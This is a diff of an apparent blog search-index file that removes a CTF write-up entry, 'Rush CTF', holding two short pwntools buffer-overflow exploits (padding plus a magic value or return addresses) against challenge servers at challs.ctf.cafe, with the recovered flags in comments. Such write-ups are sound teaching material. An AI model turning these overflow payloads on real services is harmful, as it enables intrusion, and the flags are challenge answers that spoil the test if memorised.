@@ -341,33 +341,6 @@
   
   
   <entry>
-    <title>Rush CTF</title>
-    <link href="/2023/03/15/rushCTF/"/>
-    <url>/2023/03/15/rushCTF/</url>
-    
-    <content type="html"><![CDATA[<h2 id="1-poune"><a href="#1-poune" class="headerlink" title="1.poune"></a>1.poune</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment">#p = process(&quot;./chall&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challs.ctf.cafe&quot;</span>,<span class="hljs-number">7777</span>)<br><br>g = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x38</span>+p64(<span class="hljs-number">0xc0febabe</span>)<br><span class="hljs-comment">#raw_input()</span><br>p.sendline(g)<br><span class="hljs-comment">#p.sendlineafter(b&quot;buffer: \n&quot;,p1)</span><br><br>p.interactive()<br><br><span class="hljs-comment">#RUSH&#123;TH1S_WAS_AN_3Z_CH4LLENG3_RIGHT&#125;</span><br></code></pre></td></tr></table></figure><h2 id="2-onyo"><a href="#2-onyo" class="headerlink" title="2.onyo"></a>2.onyo</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br><br><span class="hljs-comment">#p = process(&quot;./chall&quot;)</span><br>p=remote(<span class="hljs-string">&quot;challs.ctf.cafe&quot;</span>,<span class="hljs-number">8888</span>)<br>raw_input()<br>g=<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">12</span>+p64(<span class="hljs-number">0x40101a</span>)+p64(<span class="hljs-number">0x401146</span>)<br><br><span class="hljs-comment">#p.sendlineafter(b&quot;:\n&quot;,p1)</span><br>p.sendline(g)<br>p.interactive()<br><br><span class="hljs-comment">#RUSH&#123;D1d_y0u_s33_TH4t_M0m&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-    <categories>
-      
-      <category>CTF</category>
-      
-      <category>Write Up</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>Write Up</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>黄河流域公安院校网络空间安全技能挑战赛</title>
     <link href="/2023/03/12/%E9%BB%84%E6%B2%B3/"/>
     <url>/2023/03/12/%E9%BB%84%E6%B2%B3/</url>
